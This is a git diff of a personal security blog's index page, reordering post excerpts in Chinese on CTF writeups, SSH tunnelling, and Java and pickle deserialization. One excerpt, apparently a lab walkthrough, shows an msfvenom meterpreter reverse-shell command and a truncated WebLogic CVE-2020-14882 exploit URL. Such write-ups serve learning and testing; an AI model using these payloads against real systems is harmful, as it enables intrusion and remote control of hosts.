@@ -53,7 +53,7 @@
   isHome: true,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2021-12-04 16:14:25'
+  postUpdate: '2021-12-04 16:16:11'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -205,7 +205,28 @@ RCE我们需要在本地搭一个giltlab，可以直接从docker推镜像
 咕咕咕🕊
 咕咕咕结束
 送上github项目
-</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ssh隧道"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道">ssh隧道</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">ssh隧道常用参数
+</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/isoon/" title="ISOON">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISOON"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/isoon/" title="ISOON">ISOON</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">nmap扫描端口
+
+8080端口有web服务，发现是个ssrf
+可以读/etc/hosts
+
+给了内网网段，扫一波内网主机
+
+内网119有主机存活，继续扫描端口
+
+http://192.168.57.119:7001有一个web服务，使用的是weblogic框架
+WebLogic Server Version: 12.2.1.3.0
+使用（CVE2020­14882/14883）可以rce
+无回显我们可以利用msf生成一个elf马
+1./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf
+1http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.get ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初探java反序列化"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化">初探java反序列化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">java序列化是指将对象转换为字节流的过程（ObjectOutStream中的writeObject()方法）
+java反序列化就是将字节序列恢复为java对象的过程（ObjectInputStream重的readObject()方法）
+序列化对象类必须实现java.io.Serializable接口，并且所有属性的都是可序列话的
+序列化与反序列化过程1234567891011121314package Demo;import java.io.*;class User implements Serializable &#123;    private String user;    public void setUser(String name)&#123;        this.user=name;    &#125;    public String getUser()&#123;        return user;    &#125;&#125;
+
+User类继承了Serializable接口
+序列化和反序列化函数
+12345678910111213141516171819 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ssh隧道"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道">ssh隧道</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">ssh隧道常用参数
 12345678-C：压缩传输，提高传输速度-f ：将ssh传输转入后台执行，不占用当前的shell。-N：建立静默连接（建立了连接，但是看不到具体的会话）-g 允许远程主机连接本地用于转发的端口-L：本地端口转发-R：远程端口转发-D：动态转发（socks代理）-P：指定ssh端口
 
 远程端口转发
@@ -225,33 +246,12 @@ socks代理
 
 ssh -NfR remote-ip:remote-port:localhost:socks-port root@remoteip
 
-</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/10/31/general/isoon/" title="ISOON">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISOON"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/isoon/" title="ISOON">ISOON</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">nmap扫描端口
-
-8080端口有web服务，发现是个ssrf
-可以读/etc/hosts
-
-给了内网网段，扫一波内网主机
-
-内网119有主机存活，继续扫描端口
-
-http://192.168.57.119:7001有一个web服务，使用的是weblogic框架
-WebLogic Server Version: 12.2.1.3.0
-使用（CVE2020­14882/14883）可以rce
-无回显我们可以利用msf生成一个elf马
-1./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf
-1http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.get ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探pickle反序列化">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初探pickle反序列化"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探pickle反序列化">初探pickle反序列化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">初探pickle反序列化object.__reduce__函数
+</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探pickle反序列化">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初探pickle反序列化"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探pickle反序列化">初探pickle反序列化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">初探pickle反序列化object.__reduce__函数
 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。
 在下文pickle的opcode中， R 的作用与 object.__reduce__() 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 R 正好对应 object.__reduce__() 函数， object.__reduce__() 的返回值会作为 R 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 R 的
 
 picktoolspictools可以把opcode转化成规范格式，便于观看
-1234import pickletoolstest=b&#x27; ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初探java反序列化"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化">初探java反序列化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">java序列化是指将对象转换为字节流的过程（ObjectOutStream中的writeObject()方法）
-java反序列化就是将字节序列恢复为java对象的过程（ObjectInputStream重的readObject()方法）
-序列化对象类必须实现java.io.Serializable接口，并且所有属性的都是可序列话的
-序列化与反序列化过程1234567891011121314package Demo;import java.io.*;class User implements Serializable &#123;    private String user;    public void setUser(String name)&#123;        this.user=name;    &#125;    public String getUser()&#123;        return user;    &#125;&#125;
-
-User类继承了Serializable接口
-序列化和反序列化函数
-12345678910111213141516171819 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/" title="HXB writeup">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HXB writeup"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/" title="HXB writeup">HXB writeup</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">WEB题目名字不重要反正题挺简单的直接传参file=phpinfo，flag被写到环境变量
+1234import pickletoolstest=b&#x27; ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/" title="HXB writeup">     <img class="post_bg" src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HXB writeup"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/" title="HXB writeup">HXB writeup</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></span></div><div class="content">WEB题目名字不重要反正题挺简单的直接传参file=phpinfo，flag被写到环境变量
 
 NewWebsite扫描目录扫到/admin
 
